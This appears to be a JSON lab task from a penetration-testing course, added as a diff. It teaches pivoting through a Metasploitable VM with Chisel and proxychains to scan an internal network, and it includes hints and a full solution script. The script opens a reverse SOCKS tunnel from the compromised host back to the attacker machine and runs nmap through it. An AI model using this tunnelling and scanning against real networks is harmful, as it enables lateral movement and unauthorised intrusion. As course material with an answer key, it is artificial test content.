@@ -1,0 +1,15 @@
+{
+    "id": "task3",
+    "chapterId": "ch_11",
+    "title": "Pivoting with Chisel and Proxychains",
+    "description": "Set up a pivot through Metasploitable to scan an internal network.",
+    "estimatedMinutes": 40,
+    "problemStatement": "# Objective\nUse Metasploitable as a pivot host to scan a simulated internal network.\n\n## Background\n- Kali IP: `192.168.56.102` (Host-Only Network)\n- Metasploitable IP: `192.168.56.101` (Host-Only Network)\n- **Simulated Internal Network**: We'll pretend that Metasploitable has access to `10.0.2.0/24` (the NAT network of VirtualBox). In reality, you can scan Metasploitable's localhost or the Host-Only network as a proof of concept.\n\n## Steps\n1.  **On Kali**: Download `chisel` for Linux amd64 from GitHub. Start the Chisel server:\n    ```bash\n    ./chisel server -p 8000 --reverse\n    ```\n2.  **Transfer Chisel to Metasploitable**: Use `scp` or a Python HTTP server.\n    ```bash\n    scp chisel msfadmin@192.168.56.101:/tmp/\n    ```\n3.  **On Metasploitable**: Run the Chisel client:\n    ```bash\n    cd /tmp\n    chmod +x chisel\n    ./chisel client 192.168.56.102:8000 R:socks\n    ```\n4.  **On Kali**: Verify SOCKS proxy is listening on `127.0.0.1:1080`. Edit `/etc/proxychains4.conf` and ensure `socks5 127.0.0.1 1080` is uncommented.\n5.  **Test Pivot**: Run an Nmap scan through the proxy against Metasploitable's localhost (or another VM on the same network).\n    ```bash\n    proxychains nmap -sT -Pn 127.0.0.1\n    ```\n    *(Note: Scanning localhost through the pivot demonstrates the tunnel works).*\n\n## Deliverable\nScreenshot of `proxychains nmap` output showing open ports on `127.0.0.1` (or another internal IP).",
+    "hints": [
+        "Chisel server must be running before client connects.",
+        "If `proxychains` hangs, check the config file for `socks5` line.",
+        "Use `-sT` (TCP connect) with proxychains."
+    ],
+    "expectedOutput": "Nmap scan results showing ports like 21, 22, 80 open on the target.",
+    "solutionCode": "# On Kali\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz\ngunzip chisel_1.9.1_linux_amd64.gz\nchmod +x chisel_1.9.1_linux_amd64\n./chisel_1.9.1_linux_amd64 server -p 8000 --reverse &\n\n# Transfer to Metasploitable\nscp chisel_1.9.1_linux_amd64 msfadmin@192.168.56.101:/tmp/chisel\n\n# On Metasploitable (SSH)\ncd /tmp && chmod +x chisel\n./chisel client 192.168.56.102:8000 R:socks\n\n# On Kali - Test pivot\nproxychains nmap -sT -Pn 127.0.0.1"
+}
